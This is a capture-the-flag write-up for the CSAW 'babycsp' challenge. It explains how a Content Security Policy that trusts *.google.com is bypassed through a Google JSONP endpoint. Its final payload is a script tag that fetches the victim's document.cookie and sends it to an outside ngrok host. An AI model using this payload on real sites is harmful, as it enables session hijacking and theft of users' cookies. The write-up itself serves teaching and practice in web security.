# Challenge Name: babycsp
Score: 50 <br>
Vulnerability: Cross-Site Scripting (XSS) <br>
Solution: Bypass Content Security Policy (CSP) <br>
Link: http://web.chal.csaw.io:1000/ <br>
Description: 
```
I heard CSP is all the rage now. It's supposed to fix all the XSS, kill all of the confused deputies, and cure cancer?

The flag is in the cookies
```

**Part 0x01 - Information Gathering** <br>
The author wants us to bypass the Content Security Policy (CSP) to get the flag in the cookies. With this kind of challenge, we need to perform Cross-Site Scripting (XSS) attack and grab the cookie in admin side. There are 2 functions on the website. First one is posting and second one is reporting to admin.

The CSP in the website has the following policy: `default-src 'self'; script-src 'self' *.google.com; connect-src *`

![](https://github.com/ajdumanhug/ctf/blob/master/web/xss/files/Screen%20Shot%202019-09-15%20at%201.37.48%20AM.png)

The `script-src` has a value of `*.google.come` which could allow us to bypass the CSP.

**Part 0x02 - Vulnerability Exploitation** <br>
First thing we need to do is to execute an XSS. So, we have to look for a google endpoint that could help us bypass the CSP.

Well, luckily, PayloadsAllTheThings has a payload to [bypass CSP using Google endpoint](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27).

Using [apfeifer27](https://twitter.com/apfeifer27)'s CSP Bypass, we used [Fetch](https://javascript.info/fetch) to fetch the admin's cookie and pass it to our ngrok.

Final payload would be

```javascript
<script/src="https://www.google.com/complete/search?client=chrome&jsonp=fetch(/http:\\affc7f76.ngrok.io/.toString().substr(1).concat(document.cookie));"></script>
```

![](https://github.com/ajdumanhug/ctf/blob/master/web/xss/files/Screen%20Shot%202019-09-15%20at%201.51.45%20AM.png)

Please note that I am playing with hackstreetboys team and this challenge was first solved by my teammate, Ameer.

Thanks for reading.
